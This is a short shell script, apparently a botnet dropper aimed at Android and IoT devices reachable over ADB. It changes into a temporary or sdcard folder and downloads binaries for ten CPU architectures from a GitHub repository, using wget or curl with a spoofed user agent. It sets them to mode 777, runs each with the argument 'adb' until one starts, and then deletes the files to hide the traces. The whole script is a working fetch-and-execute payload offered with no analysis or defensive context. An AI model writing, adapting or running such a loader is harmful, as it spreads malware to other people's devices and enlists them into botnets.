#!/bin/sh
# sync2.sh - Universal architecture detection and payload execution

# Change to tmp directory
cd /data/local/tmp 2>/dev/null || cd /tmp 2>/dev/null || cd /sdcard 2>/dev/null

# Cleanup any previous runs
rm -rf sync.* 2>/dev/null

# Function to try downloading a file with multiple methods
download_file() {
  URL="$1"
  OUTPUT="$2"
  
  # Try different download methods
  busybox wget "$URL" -O "$OUTPUT" 2>/dev/null || \
  wget "$URL" -O "$OUTPUT" 2>/dev/null || \
  curl -L -s -H "User-Agent: Mozilla/5.0" "$URL" -o "$OUTPUT" 2>/dev/null || \
  curl -s "$URL" -o "$OUTPUT" 2>/dev/null
  
  # Make executable if file exists and has size > 0
  if [ -s "$OUTPUT" ]; then
    chmod 777 "$OUTPUT" 2>/dev/null
    return 0
  else
    return 1
  fi
}

# List of architectures to try
ARCHS="arm7 arm6 arm5 arm4 x86 mips mipsel powerpc m68k sh4"
BASE_URL="https://raw.githubusercontent.com/joaophillipdev/1isb82ufkoy28utga0h/main"
FALLBACK_URL="https://github.com/joaophillipdev/1isb82ufkoy28utga0h/raw/refs/heads/main"

# Download all architectures we might need
for ARCH in $ARCHS; do
  download_file "$BASE_URL/sync.$ARCH" "sync.$ARCH" || \
  download_file "$FALLBACK_URL/sync.$ARCH" "sync.$ARCH"
done

# Try to execute each architecture until one works
for ARCH in $ARCHS; do
  if [ -f "sync.$ARCH" ]; then
    ./sync.$ARCH adb && {
      echo "Success with architecture: $ARCH"
      # Clean up only if successful
      rm -rf sync.* 2>/dev/null
      exit 0
    }
  fi
done

# If we get here, all attempts failed
rm -rf sync.* 2>/dev/null
exit 1
